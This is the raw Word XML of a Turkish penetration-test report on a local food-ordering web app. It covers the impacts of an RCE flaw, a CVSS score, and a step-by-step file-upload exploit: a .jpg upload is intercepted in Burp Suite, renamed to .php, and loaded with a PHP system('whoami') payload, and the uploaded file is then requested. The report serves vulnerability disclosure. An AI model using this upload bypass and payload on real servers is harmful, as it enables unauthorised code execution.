              <w:t>Aynı dosya ismi ile yüklenmeleri durumunda yeni isimler verin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A60AAB1" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00402B96" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w14:paraId="029FB9AB" w14:textId="77777777" w:rsidTr="005C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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="67B76B64" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w14:paraId="0746A3CA" w14:textId="77777777" w:rsidTr="005C66ED">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="44A27C89" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="15"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Tam Kontrol: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde tam kontrol sağlayabilir. Bu, dosya sistemine erişim, sistem ayarlarını değiştirme ve yazılımları yükleme veya kaldırma anlamına gelir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28905C14" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4529409C" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Veri Hırsızlığı: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>RCE zafiyeti sayesinde, saldırgan hassas verilere (şifreler, kişisel bilgiler, finansal veriler vb.) erişebilir ve bunları çalabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AA0763D" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="58E4ECA2" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Zarar Verme: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde kötü amaçlı yazılımlar, virüsler veya truva atları yükleyerek sistemin işleyişini bozabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6156E0F6" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5D011C99" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Ağ İçin Tehdit: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Hedef sistemin yanı sıra, RCE zafiyetleri, diğer bağlı sistemlere (ağdaki diğer cihazlar, sunucular vb.) de zarar verebilir veya erişim sağlayabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EB3149E" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="072AAE9E" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0B79A63D" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Veri Bütünlüğünün İhlali:</w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Saldırgan, verileri değiştirebilir veya silebilir, bu da veri bütünlüğünü ciddi şekilde etkileyebilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54EB2689" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5C322E55" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Hizmet Durdurma: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, sistem kaynaklarını aşırı şekilde kullanarak hedef sistemin hizmet dışı kalmasına neden olabilir (DoS/DDoS saldırıları).</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C28678C" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="05191239" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRPr="00991F03" w:rsidRDefault="006D1C31" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Sistem İzleme: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde gizlice izleme yaparak kullanıcıların etkinliklerini gözlemleyebilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DDCB634" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w:rsidRPr="00402B96" w14:paraId="5313ABDA" w14:textId="77777777" w:rsidTr="005C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3C062705" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="005C66ED">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w:rsidRPr="00402B96" w14:paraId="14D712F9" w14:textId="77777777" w:rsidTr="005C66ED">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="34B4BD83" w14:textId="3C67737D" w:rsidR="006D1C31" w:rsidRPr="00C361DB" w:rsidRDefault="002A5B2A" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>7.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D1C31" w:rsidRPr="00402B96" w14:paraId="7EA0FCB7" w14:textId="77777777" w:rsidTr="005C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19FF9FC5" w14:textId="183A4A9C" w:rsidR="006D1C31" w:rsidRPr="00402B96" w:rsidRDefault="00986042" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="179BE696" w14:textId="77777777" w:rsidR="006D1C31" w:rsidRDefault="006D1C31" w:rsidP="006D1C31"/>
    <w:p w14:paraId="3EDF3FA8" w14:textId="687626A6" w:rsidR="002A5B2A" w:rsidRDefault="002A5B2A" w:rsidP="002A5B2A">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>3) Remote Code Execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C59CC6A" w14:textId="77777777" w:rsidR="002A5B2A" w:rsidRDefault="002A5B2A" w:rsidP="002A5B2A"/>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AD7526" w14:paraId="6393FCE1" w14:textId="77777777" w:rsidTr="005C66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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="206F2966" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w14:paraId="594F02BF" w14:textId="77777777" w:rsidTr="005C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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="3F5920E0" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Remote Code Execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w14:paraId="1420386A" w14:textId="77777777" w:rsidTr="005C66ED">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47293D44" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w:rsidRPr="00057867" w14:paraId="3904327F" w14:textId="77777777" w:rsidTr="005C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332104C3" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14C086E8" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRPr="00BF4DE0" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AD7526" w:rsidRPr="00057867" w14:paraId="69707D60" w14:textId="77777777" w:rsidTr="005C66ED">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="7111FF29" w14:textId="6BFFD72A" w:rsidR="00AD7526" w:rsidRPr="00EE6B0D" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId18" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> firma</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId19" w:history="1">
              <w:r w:rsidR="008F760D" w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/company_add_food.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="008F760D">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. </w:t>
            </w:r>
            <w:r w:rsidR="008F760D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Yemek</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> resmi seçin butonuna tıklanır ve test.jpg dosyası sistemi yüklenir ve istek </w:t>
            </w:r>
            <w:r w:rsidRPr="0020446C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>BurpSuite proxy aracı ile yakalanır</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> ve isteğe sağ tıklanıp “send to repeater” seçeneği seçilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A76BD9B" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1854CAF0" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="13E6F311" wp14:editId="1E079710">
                  <wp:extent cx="5713730" cy="2694940"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="0"/>
                  <wp:docPr id="761408645"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3730" cy="2694940"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="07FA14AF" w14:textId="17FAE530" w:rsidR="00AD7526" w:rsidRPr="00C361DB" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidR="005B76F9">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Dosya Yükleme İsteği</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FF83998" w14:textId="77777777" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="005C66ED">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="10C642A8" w14:textId="27F4B2A4" w:rsidR="00AD7526" w:rsidRDefault="00AD7526" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Dosya uzantısı .php ile değiştirilir ve </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>Content-Disposition: form-data; name="update_profile_picture"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Header’ının altına </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>“&lt;?php $value = system("</w:t>
            </w:r>
            <w:r>
              <w:t>whoami</w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>");  echo $value; ?&gt;</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">bu payload yazılır. Ardından istek gönderilir. Sistemden çıkış yapılır ve </w:t>
            </w:r>
            <w:hyperlink r:id="rId20" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> müşteri</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId21" w:history="1">
              <w:r w:rsidR="008F760D" w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/customer_food_search.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="008F760D">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilip seçilen restauran’ın &lt;img&gt; etiketi içinde </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> yüklenen dosyanın konumu bulunur. Bulunan konuma (</w:t>
            </w:r>
            <w:hyperlink r:id="rId22" w:history="1">
              <w:r w:rsidR="005B76F9" w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/uploads/food_images/66fee8b7bec0b_test.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="008F760D">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>) istek atılır. Böyle başarıyla sunucu üzerinde uzaktan kod yürütülür.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20F7D09E" w14:textId="20D506FD" w:rsidR="00AD7526" w:rsidRDefault="005B76F9" w:rsidP="005C66ED">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005B76F9">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2779C95D" wp14:editId="062ECA22">
                  <wp:extent cx="5713730" cy="1145540"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="0"/>
                  <wp:docPr id="72034587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345874" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
